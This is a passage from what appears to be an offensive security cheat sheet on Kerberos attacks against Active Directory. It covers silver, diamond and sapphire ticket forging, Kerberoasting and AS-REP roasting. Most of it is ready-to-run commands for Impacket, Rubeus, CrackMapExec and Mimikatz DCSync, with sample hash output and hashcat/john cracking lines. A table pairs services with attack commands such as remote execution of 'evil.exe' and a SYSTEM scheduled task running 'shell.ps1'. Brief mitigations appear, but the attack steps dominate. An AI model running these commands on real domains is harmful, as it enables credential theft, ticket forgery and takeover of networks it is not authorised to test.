<a id="__codelineno-142-12" name="__codelineno-142-12" href="#__codelineno-142-12"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:/</span><span class="n">tmp</span><span class="p">$</span> <span class="p">./</span><span class="n">psexec</span><span class="p">.</span><span class="n">py</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="n">-dc-ip</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="n">AD</span><span class="p">/</span><span class="n">administrator</span><span class="nv">@192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">100</span> 
</code></pre></div>
<p>Interesting services to target with a silver ticket :</p>
<table>
<thead>
<tr>
<th>Service Type</th>
<th>Service Silver Tickets</th>
<th>Attack</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST + RPCSS</td>
<td><code>wmic.exe /authority:"kerberos:DOMAIN\DC01" /node:"DC01" process call create "cmd /c evil.exe"</code></td>
</tr>
<tr>
<td>PowerShell Remoting</td>
<td>CIFS + HTTP + (wsman?)</td>
<td><code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
</tr>
<tr>
<td>WinRM</td>
<td>HTTP + wsman</td>
<td><code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code></td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
<td><code>schtasks /create /s dc01 /SC WEEKLY /RU "NT Authority\System" /IN "SCOM Agent Health Check" /IR "C:/shell.ps1"</code></td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>CIFS</td>
<td><code>dir \\dc01\c$</code></td>
</tr>
<tr>
<td>LDAP operations including Mimikatz DCSync</td>
<td>LDAP</td>
<td><code>lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code></td>
</tr>
<tr>
<td>Windows Remote Server Administration Tools</td>
<td>RPCSS   + LDAP  + CIFS</td>
<td>/</td>
</tr>
</tbody>
</table>
<p>Mitigations:
* Set the attribute "Account is Sensitive and Cannot be Delegated" to prevent lateral movement with the generated ticket.</p>
<h3 id="pass-the-ticket-diamond-tickets">Pass-the-Ticket Diamond Tickets</h3>
<blockquote>
<p>Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key</p>
</blockquote>
<p>Require: 
* krbtgt NT Hash
* krbtgt AES key</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-143-1" name="__codelineno-143-1" href="#__codelineno-143-1"></a><span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="n">-request</span> <span class="n">-domain</span> <span class="s1">&#39;lab.local&#39;</span> <span class="n">-user</span> <span class="s1">&#39;domain_user&#39;</span> <span class="n">-password</span> <span class="s1">&#39;password&#39;</span> <span class="n">-nthash</span> <span class="s1">&#39;krbtgt/service NT hash&#39;</span> <span class="n">-aesKey</span> <span class="s1">&#39;krbtgt/service AES key&#39;</span> <span class="n">-domain-sid</span> <span class="s1">&#39;S-1-5-21-...&#39;</span> <span class="n">-user-id</span> <span class="s1">&#39;1337&#39;</span> <span class="n">-groups</span> <span class="s1">&#39;512,513,518,519,520&#39;</span> <span class="s1">&#39;baduser&#39;</span>
<a id="__codelineno-143-2" name="__codelineno-143-2" href="#__codelineno-143-2"></a>
<a id="__codelineno-143-3" name="__codelineno-143-3" href="#__codelineno-143-3"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">diamond</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="n">PASSWORD</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span> <span class="p">/</span><span class="n">enctype</span><span class="p">:</span><span class="n">AES256</span> <span class="p">/</span><span class="n">krbkey</span><span class="p">:</span><span class="n">HASH</span> <span class="p">/</span><span class="n">ticketuser</span><span class="p">:</span><span class="n">USERNAME</span> <span class="p">/</span><span class="n">ticketuserid</span><span class="p">:</span><span class="n">USER_ID</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="n">GROUP_IDS</span>
</code></pre></div>
<h3 id="pass-the-ticket-sapphire-tickets">Pass-the-Ticket Sapphire Tickets</h3>
<blockquote>
<p>Requesting the target user's PAC with <code>S4U2self+U2U</code> exchange during TGS-REQ(P) (PKINIT).</p>
</blockquote>
<p>The goal is to mimic the PAC field as close as possible to a legitimate one.</p>
<p>Require:
* <a href="https://github.com/SecureAuthCorp/impacket/pull/1411">Impacket PR#1411</a>
* krbtgt AES key</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-144-1" name="__codelineno-144-1" href="#__codelineno-144-1"></a><span class="c"># baduser argument will be ignored</span>
<a id="__codelineno-144-2" name="__codelineno-144-2" href="#__codelineno-144-2"></a><span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="n">-request</span> <span class="n">-impersonate</span> <span class="s1">&#39;domain_adm&#39;</span> <span class="n">-domain</span> <span class="s1">&#39;lab.local&#39;</span> <span class="n">-user</span> <span class="s1">&#39;domain_user&#39;</span> <span class="n">-password</span> <span class="s1">&#39;password&#39;</span> <span class="n">-aesKey</span> <span class="s1">&#39;krbtgt/service AES key&#39;</span> <span class="n">-domain-sid</span> <span class="s1">&#39;S-1-5-21-...&#39;</span> <span class="s1">&#39;baduser&#39;</span>
</code></pre></div>
<h2 id="kerberoasting">Kerberoasting</h2>
<blockquote>
<p>"A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. " - <a href="https://docs.microsoft.com/fr-fr/windows/desktop/AD/service-principal-names">MSDN</a></p>
</blockquote>
<p>Any valid domain user can request a kerberos ticket (ST) for any domain service. Once the ticket is received, password cracking can be done offline on the ticket to attempt to break the password for whatever user the service is running as.</p>
<ul>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py">GetUserSPNs</a> from Impacket Suite
  <div class="highlight"><pre><span></span><code><a id="__codelineno-145-1" name="__codelineno-145-1" href="#__codelineno-145-1"></a><span class="p">$</span> <span class="n">GetUserSPNs</span><span class="p">.</span><span class="n">py</span> <span class="n">active</span><span class="p">.</span><span class="n">htb</span><span class="p">/</span><span class="n">SVC_TGS</span><span class="p">:</span><span class="n">GPPstillStandingStrong2k18</span> <span class="n">-dc-ip</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">100</span> <span class="n">-request</span>
<a id="__codelineno-145-2" name="__codelineno-145-2" href="#__codelineno-145-2"></a>
<a id="__codelineno-145-3" name="__codelineno-145-3" href="#__codelineno-145-3"></a><span class="n">Impacket</span> <span class="n">v0</span><span class="p">.</span><span class="n">9</span><span class="p">.</span><span class="n">17</span> <span class="p">-</span> <span class="n">Copyright</span> <span class="n">2002</span><span class="p">-</span><span class="n">2018</span> <span class="n">Core</span> <span class="n">Security</span> <span class="n">Technologies</span>
<a id="__codelineno-145-4" name="__codelineno-145-4" href="#__codelineno-145-4"></a>
<a id="__codelineno-145-5" name="__codelineno-145-5" href="#__codelineno-145-5"></a><span class="n">ServicePrincipalName</span>  <span class="n">Name</span>           <span class="n">MemberOf</span>                                                  <span class="n">PasswordLastSet</span>      <span class="n">LastLogon</span>           
<a id="__codelineno-145-6" name="__codelineno-145-6" href="#__codelineno-145-6"></a><span class="p">--------------------</span>  <span class="p">-------------</span>  <span class="p">--------------------------------------------------------</span>  <span class="p">-------------------</span>  <span class="p">-------------------</span>
<a id="__codelineno-145-7" name="__codelineno-145-7" href="#__codelineno-145-7"></a><span class="n">active</span><span class="p">/</span><span class="n">CIFS</span><span class="p">:</span><span class="n">445</span>       <span class="n">Administrator</span>  <span class="n">CN</span><span class="p">=</span><span class="nb">Group </span><span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span><span class="p">,</span><span class="n">CN</span><span class="p">=</span><span class="n">Users</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">active</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">htb</span>  <span class="n">2018</span><span class="p">-</span><span class="n">07</span><span class="p">-</span><span class="n">18</span> <span class="n">21</span><span class="p">:</span><span class="n">06</span><span class="p">:</span><span class="n">40</span>  <span class="n">2018</span><span class="p">-</span><span class="n">12</span><span class="p">-</span><span class="n">03</span> <span class="n">17</span><span class="p">:</span><span class="n">11</span><span class="p">:</span><span class="n">11</span> 
<a id="__codelineno-145-8" name="__codelineno-145-8" href="#__codelineno-145-8"></a>
<a id="__codelineno-145-9" name="__codelineno-145-9" href="#__codelineno-145-9"></a><span class="nv">$krb5tgs$23</span><span class="p">$*</span><span class="n">Administrator</span><span class="nv">$ACTIVE</span><span class="p">.</span><span class="n">HTB</span><span class="nv">$active</span><span class="p">/</span><span class="n">CIFS</span><span class="p">~</span><span class="n">445</span><span class="p">*</span><span class="nv">$424338c0a3c3af43</span><span class="p">[...]</span><span class="n">84fd2</span>
</code></pre></div></p>
</li>
<li>
<p>CrackMapExec Module
  <div class="highlight"><pre><span></span><code><a id="__codelineno-146-1" name="__codelineno-146-1" href="#__codelineno-146-1"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="n">-u</span> <span class="s1">&#39;username&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-kdcHost</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="p">-</span><span class="n">-kerberoast</span> <span class="n">output</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-146-2" name="__codelineno-146-2" href="#__codelineno-146-2"></a><span class="n">LDAP</span>        <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>           <span class="p">[*]</span> <span class="n">Windows</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span> <span class="n">Build</span> <span class="n">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">dc01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="n">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="n">False</span><span class="p">)</span>
<a id="__codelineno-146-3" name="__codelineno-146-3" href="#__codelineno-146-3"></a><span class="n">LDAP</span>        <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>           <span class="nv">$krb5tgs$23</span><span class="p">$*</span><span class="n">john</span><span class="p">.</span><span class="n">doe</span><span class="nv">$lab</span><span class="p">.</span><span class="n">local</span><span class="nv">$MSSQLSvc</span><span class="p">/</span><span class="n">dc01</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span><span class="p">~</span><span class="n">1433</span><span class="p">*</span><span class="nv">$efea32</span><span class="p">[...]</span><span class="n">49a5e82</span><span class="nv">$b28fc61</span><span class="p">[...]</span><span class="n">f800f6dcd259ea1fca8f9</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-147-1" name="__codelineno-147-1" href="#__codelineno-147-1"></a><span class="c"># Stats</span>
<a id="__codelineno-147-2" name="__codelineno-147-2" href="#__codelineno-147-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span>
<a id="__codelineno-147-3" name="__codelineno-147-3" href="#__codelineno-147-3"></a><span class="p">-------------------------------------</span>   <span class="p">----------------------------------</span>
<a id="__codelineno-147-4" name="__codelineno-147-4" href="#__codelineno-147-4"></a><span class="p">|</span> <span class="n">Supported</span> <span class="n">Encryption</span> <span class="nb">Type </span><span class="p">|</span> <span class="n">Count</span> <span class="p">|</span>  <span class="p">|</span> <span class="n">Password</span> <span class="n">Last</span> <span class="nb">Set </span><span class="n">Year</span> <span class="p">|</span> <span class="n">Count</span> <span class="p">|</span>
<a id="__codelineno-147-5" name="__codelineno-147-5" href="#__codelineno-147-5"></a><span class="p">-------------------------------------</span>  <span class="p">----------------------------------</span>
<a id="__codelineno-147-6" name="__codelineno-147-6" href="#__codelineno-147-6"></a><span class="p">|</span> <span class="n">RC4_HMAC_DEFAULT</span>          <span class="p">|</span> <span class="n">1</span>     <span class="p">|</span>  <span class="p">|</span> <span class="n">2021</span>                   <span class="p">|</span> <span class="n">1</span>     <span class="p">|</span>
<a id="__codelineno-147-7" name="__codelineno-147-7" href="#__codelineno-147-7"></a><span class="p">-------------------------------------</span>  <span class="p">----------------------------------</span>
<a id="__codelineno-147-8" name="__codelineno-147-8" href="#__codelineno-147-8"></a>
<a id="__codelineno-147-9" name="__codelineno-147-9" href="#__codelineno-147-9"></a><span class="c"># Kerberoast (RC4 ticket)</span>
<a id="__codelineno-147-10" name="__codelineno-147-10" href="#__codelineno-147-10"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">creduser</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">\</span><span class="n">JOHN</span> <span class="p">/</span><span class="n">credpassword</span><span class="p">:</span><span class="n">MyP</span><span class="nv">@ssW0RD</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hash</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-147-11" name="__codelineno-147-11" href="#__codelineno-147-11"></a>
<a id="__codelineno-147-12" name="__codelineno-147-12" href="#__codelineno-147-12"></a><span class="c"># Kerberoast (AES ticket)</span>
<a id="__codelineno-147-13" name="__codelineno-147-13" href="#__codelineno-147-13"></a><span class="c"># Accounts with AES enabled in msDS-SupportedEncryptionTypes will have RC4 tickets requested.</span>
<a id="__codelineno-147-14" name="__codelineno-147-14" href="#__codelineno-147-14"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">tgtdeleg</span>
<a id="__codelineno-147-15" name="__codelineno-147-15" href="#__codelineno-147-15"></a>
<a id="__codelineno-147-16" name="__codelineno-147-16" href="#__codelineno-147-16"></a><span class="c"># Kerberoast (RC4 ticket)</span>
<a id="__codelineno-147-17" name="__codelineno-147-17" href="#__codelineno-147-17"></a><span class="c"># The tgtdeleg trick is used, and accounts without AES enabled are enumerated and roasted.</span>
<a id="__codelineno-147-18" name="__codelineno-147-18" href="#__codelineno-147-18"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">rc4opsec</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-148-1" name="__codelineno-148-1" href="#__codelineno-148-1"></a><span class="nb">Request-SPNTicket</span> <span class="n">-SPN</span> <span class="s2">&quot;MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local&quot;</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/its-a-feature/bifrost">bifrost</a> on <strong>macOS</strong> machine
  <div class="highlight"><pre><span></span><code><a id="__codelineno-149-1" name="__codelineno-149-1" href="#__codelineno-149-1"></a><span class="p">./</span><span class="n">bifrost</span> <span class="n">-action</span> <span class="n">asktgs</span> <span class="n">-ticket</span> <span class="n">doIF</span><span class="p">&lt;...</span><span class="n">snip</span><span class="p">...&gt;</span><span class="n">QUw</span><span class="p">=</span> <span class="n">-service</span> <span class="n">host</span><span class="p">/</span><span class="n">dc1-lab</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span class="n">local</span> <span class="n">-kerberoast</span> <span class="n">true</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/ShutdownRepo/targetedKerberoast">targetedKerberoast</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-150-1" name="__codelineno-150-1" href="#__codelineno-150-1"></a><span class="c"># for each user without SPNs, it tries to set one (abuse of a write permission on the servicePrincipalName attribute), </span>
<a id="__codelineno-150-2" name="__codelineno-150-2" href="#__codelineno-150-2"></a><span class="c"># print the &quot;kerberoast&quot; hash, and delete the temporary SPN set for that operation</span>
<a id="__codelineno-150-3" name="__codelineno-150-3" href="#__codelineno-150-3"></a><span class="n">targetedKerberoast</span><span class="p">.</span><span class="n">py</span> <span class="p">[</span><span class="n">-h</span><span class="p">]</span> <span class="p">[</span><span class="n">-v</span><span class="p">]</span> <span class="p">[</span><span class="n">-q</span><span class="p">]</span> <span class="p">[</span><span class="n">-D</span> <span class="n">TARGET_DOMAIN</span><span class="p">]</span> <span class="p">[</span><span class="n">-U</span> <span class="n">USERS_FILE</span><span class="p">]</span> <span class="p">[-</span><span class="n">-request-user</span> <span class="n">username</span><span class="p">]</span> <span class="p">[</span><span class="n">-o</span> <span class="n">OUTPUT_FILE</span><span class="p">]</span> <span class="p">[-</span><span class="n">-use-ldaps</span><span class="p">]</span> <span class="p">[-</span><span class="n">-only-abuse</span><span class="p">]</span> <span class="p">[-</span><span class="n">-no-abuse</span><span class="p">]</span> <span class="p">[-</span><span class="n">-dc-ip</span> <span class="n">ip</span> <span class="n">address</span><span class="p">]</span> <span class="p">[</span><span class="n">-d</span> <span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[</span><span class="n">-u</span> <span class="n">USER</span><span class="p">]</span> <span class="p">[</span><span class="n">-k</span><span class="p">]</span> <span class="p">[-</span><span class="n">-no-pass</span> <span class="p">|</span> <span class="n">-p</span> <span class="n">PASSWORD</span> <span class="p">|</span> <span class="n">-H</span> <span class="p">[</span><span class="n">LMHASH</span><span class="p">:]</span><span class="n">NTHASH</span> <span class="p">|</span> <span class="p">-</span><span class="n">-aes-key</span> <span class="n">hex</span> <span class="n">key</span><span class="p">]</span>
</code></pre></div></p>
</li>
</ul>
<p>Then crack the ticket using the correct hashcat mode (<code>$krb5tgs$23</code>= <code>etype 23</code>) </p>
<table>
<thead>
<tr>
<th>Mode</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>13100</code></td>
<td>Kerberos 5 TGS-REP etype 23 (RC4)</td>
</tr>
<tr>
<td><code>19600</code></td>
<td>Kerberos 5 TGS-REP etype 17 (AES128-CTS-HMAC-SHA1-96)</td>
</tr>
<tr>
<td><code>19700</code></td>
<td>Kerberos 5 TGS-REP etype 18 (AES256-CTS-HMAC-SHA1-96)</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre><span></span><code><a id="__codelineno-151-1" name="__codelineno-151-1" href="#__codelineno-151-1"></a><span class="p">./</span><span class="n">hashcat</span> <span class="n">-m</span> <span class="n">13100</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">kerberos_hashes</span><span class="p">.</span><span class="n">txt</span> <span class="n">crackstation</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-151-2" name="__codelineno-151-2" href="#__codelineno-151-2"></a><span class="p">./</span><span class="n">john</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=/</span><span class="n">opt</span><span class="p">/</span><span class="n">wordlists</span><span class="p">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="p">-</span><span class="n">-fork</span><span class="p">=</span><span class="n">4</span> <span class="p">-</span><span class="n">-format</span><span class="p">=</span><span class="n">krb5tgs</span> <span class="p">~/</span><span class="n">kerberos_hashes</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<p>Mitigations: 
* Have a very long password for your accounts with SPNs (&gt; 32 characters)
* Make sure no users have SPNs</p>
<h2 id="krb_as_rep-roasting">KRB_AS_REP Roasting</h2>
<blockquote>
<p>If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully requested for the user, and a component of the structure can be cracked offline a la kerberoasting</p>
</blockquote>
<p><strong>Requirements</strong>:
- Accounts with the attribute <strong>DONT_REQ_PREAUTH</strong> (<code>PowerView &gt; Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</code>)</p>
<ul>
<li>
<p><a href="https://github.com/GhostPack/Rubeus">Rubeus</a>
  <div class="highlight"><pre><span></span><code><a id="__codelineno-152-1" name="__codelineno-152-1" href="#__codelineno-152-1"></a><span class="n">C</span><span class="p">:\</span><span class="n">Rubeus</span><span class="p">&gt;</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asreproast</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">TestOU3user</span> <span class="p">/</span><span class="n">format</span><span class="p">:</span><span class="n">hashcat</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span>
<a id="__codelineno-152-2" name="__codelineno-152-2" href="#__codelineno-152-2"></a><span class="p">[*]</span> <span class="n">Action</span><span class="p">:</span> <span class="n">AS-REP</span> <span class="n">roasting</span>
<a id="__codelineno-152-3" name="__codelineno-152-3" href="#__codelineno-152-3"></a><span class="p">[*]</span> <span class="n">Target</span> <span class="n">User</span>            <span class="p">:</span> <span class="n">TestOU3user</span>
<a id="__codelineno-152-4" name="__codelineno-152-4" href="#__codelineno-152-4"></a><span class="p">[*]</span> <span class="n">Target</span> <span class="n">Domain</span>          <span class="p">:</span> <span class="n">testlab</span><span class="p">.</span><span class="n">local</span>
<a id="__codelineno-152-5" name="__codelineno-152-5" href="#__codelineno-152-5"></a><span class="p">[*]</span> <span class="n">SamAccountName</span>         <span class="p">:</span> <span class="n">TestOU3user</span>
<a id="__codelineno-152-6" name="__codelineno-152-6" href="#__codelineno-152-6"></a><span class="p">[*]</span> <span class="n">DistinguishedName</span>      <span class="p">:</span> <span class="n">CN</span><span class="p">=</span><span class="n">TestOU3user</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">TestOU3</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">TestOU2</span><span class="p">,</span><span class="n">OU</span><span class="p">=</span><span class="n">TestOU1</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">testlab</span><span class="p">,</span><span class="n">DC</span><span class="p">=</span><span class="n">local</span>
<a id="__codelineno-152-7" name="__codelineno-152-7" href="#__codelineno-152-7"></a><span class="p">[*]</span> <span class="n">Using</span> <span class="n">domain</span> <span class="n">controller</span><span class="p">:</span> <span class="n">testlab</span><span class="p">.</span><span class="n">local</span> <span class="p">(</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">52</span><span class="p">.</span><span class="n">100</span><span class="p">)</span>
<a id="__codelineno-152-8" name="__codelineno-152-8" href="#__codelineno-152-8"></a><span class="p">[*]</span> <span class="n">Building</span> <span class="n">AS-REQ</span> <span class="p">(</span><span class="n">w</span><span class="p">/</span><span class="n">o</span> <span class="n">preauth</span><span class="p">)</span> <span class="k">for</span><span class="p">:</span> <span class="s1">&#39;testlab.local\TestOU3user&#39;</span>
<a id="__codelineno-152-9" name="__codelineno-152-9" href="#__codelineno-152-9"></a><span class="p">[*]</span> <span class="n">Connecting</span> <span class="n">to</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">52</span><span class="p">.</span><span class="n">100</span><span class="p">:</span><span class="n">88</span>
<a id="__codelineno-152-10" name="__codelineno-152-10" href="#__codelineno-152-10"></a><span class="p">[*]</span> <span class="n">Sent</span> <span class="n">169</span> <span class="n">bytes</span>
<a id="__codelineno-152-11" name="__codelineno-152-11" href="#__codelineno-152-11"></a><span class="p">[*]</span> <span class="n">Received</span> <span class="n">1437</span> <span class="n">bytes</span>
<a id="__codelineno-152-12" name="__codelineno-152-12" href="#__codelineno-152-12"></a><span class="p">[+]</span> <span class="n">AS-REQ</span> <span class="n">w</span><span class="p">/</span><span class="n">o</span> <span class="n">preauth</span> <span class="n">successful</span><span class="p">!</span>
<a id="__codelineno-152-13" name="__codelineno-152-13" href="#__codelineno-152-13"></a><span class="p">[*]</span> <span class="n">AS-REP</span> <span class="n">hash</span><span class="p">:</span>
<a id="__codelineno-152-14" name="__codelineno-152-14" href="#__codelineno-152-14"></a>
<a id="__codelineno-152-15" name="__codelineno-152-15" href="#__codelineno-152-15"></a><span class="nv">$krb5asrep$TestOU3user@testlab</span><span class="p">.</span><span class="k">local:</span><span class="n">858B6F645D9F9B57210292E5711E0</span><span class="p">...(</span><span class="n">snip</span><span class="p">)...</span>
</code></pre></div></p>
</li>
<li>
<p><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py">GetNPUsers</a> from Impacket Suite
  <div class="highlight"><pre><span></span><code><a id="__codelineno-153-1" name="__codelineno-153-1" href="#__codelineno-153-1"></a><span class="p">$</span> <span class="n">python</span> <span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span> <span class="n">htb</span><span class="p">.</span><span class="n">local</span><span class="p">/</span><span class="n">svc-alfresco</span> <span class="n">-no-pass</span>
<a id="__codelineno-153-2" name="__codelineno-153-2" href="#__codelineno-153-2"></a><span class="p">[*]</span> <span class="n">Getting</span> <span class="n">TGT</span> <span class="k">for</span> <span class="n">svc-alfresco</span>
<a id="__codelineno-153-3" name="__codelineno-153-3" href="#__codelineno-153-3"></a><span class="nv">$krb5asrep$23$svc</span><span class="n">-alfresco</span><span class="nv">@HTB</span><span class="p">.</span><span class="k">LOCAL:</span><span class="n">c13528009a59be0a634bb9b8e84c88ee</span><span class="nv">$cb8e87d02bd0ac7a</span><span class="p">[...]</span><span class="n">e776b4</span>
<a id="__codelineno-153-4" name="__codelineno-153-4" href="#__codelineno-153-4"></a>
<a id="__codelineno-153-5" name="__codelineno-153-5" href="#__codelineno-153-5"></a><span class="c"># extract hashes</span>
<a id="__codelineno-153-6" name="__codelineno-153-6" href="#__codelineno-153-6"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:</span><span class="n">impacket-examples</span><span class="p">$</span> <span class="n">python</span> <span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span> <span class="n">jurassic</span><span class="p">.</span><span class="n">park</span><span class="p">/</span> <span class="n">-usersfile</span> <span class="n">usernames</span><span class="p">.</span><span class="n">txt</span> <span class="n">-format</span> <span class="n">hashcat</span> <span class="n">-outputfile</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span>
<a id="__codelineno-153-7" name="__codelineno-153-7" href="#__codelineno-153-7"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:</span><span class="n">impacket-examples</span><span class="p">$</span> <span class="n">python</span> <span class="n">GetNPUsers</span><span class="p">.</span><span class="n">py</span> <span class="n">jurassic</span><span class="p">.</span><span class="n">park</span><span class="p">/</span><span class="n">triceratops</span><span class="p">:</span><span class="n">Sh4rpH0rns</span> <span class="n">-request</span> <span class="n">-format</span> <span class="n">hashcat</span> <span class="n">-outputfile</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span>
</code></pre></div></p>
</li>
<li>
<p>CrackMapExec Module
  <div class="highlight"><pre><span></span><code><a id="__codelineno-154-1" name="__codelineno-154-1" href="#__codelineno-154-1"></a><span class="p">$</span> <span class="n">crackmapexec</span> <span class="n">ldap</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="n">-u</span> <span class="s1">&#39;username&#39;</span> <span class="n">-p</span> <span class="s1">&#39;password&#39;</span> <span class="p">-</span><span class="n">-kdcHost</span> <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span> <span class="p">-</span><span class="n">-asreproast</span> <span class="n">output</span><span class="p">.</span><span class="n">txt</span>
<a id="__codelineno-154-2" name="__codelineno-154-2" href="#__codelineno-154-2"></a><span class="n">LDAP</span>        <span class="n">10</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">11</span>       <span class="n">389</span>    <span class="n">dc01</span>           <span class="nv">$krb5asrep$23$john</span><span class="p">.</span><span class="n">doe</span><span class="nv">@LAB</span><span class="p">.</span><span class="k">LOCAL:</span><span class="n">5d1f750</span><span class="p">[...]</span><span class="n">2a6270d7</span><span class="nv">$096fc87726c64e545acd4687faf780</span><span class="p">[...]</span><span class="n">13ea567d5</span>
</code></pre></div></p>
</li>
</ul>
<p>Using <code>hashcat</code> or <code>john</code> to crack the ticket.</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-155-1" name="__codelineno-155-1" href="#__codelineno-155-1"></a><span class="c"># crack AS_REP messages with hashcat</span>
<a id="__codelineno-155-2" name="__codelineno-155-2" href="#__codelineno-155-2"></a><span class="n">root</span><span class="nv">@kali</span><span class="p">:</span><span class="n">impacket-examples</span><span class="p">$</span> <span class="n">hashcat</span> <span class="n">-m</span> <span class="n">18200</span> <span class="p">-</span><span class="n">-force</span> <span class="n">-a</span> <span class="n">0</span> <span class="n">hashes</span><span class="p">.</span><span class="n">asreproast</span> <span class="n">passwords_kerb</span><span class="p">.</span><span class="n">txt</span> 
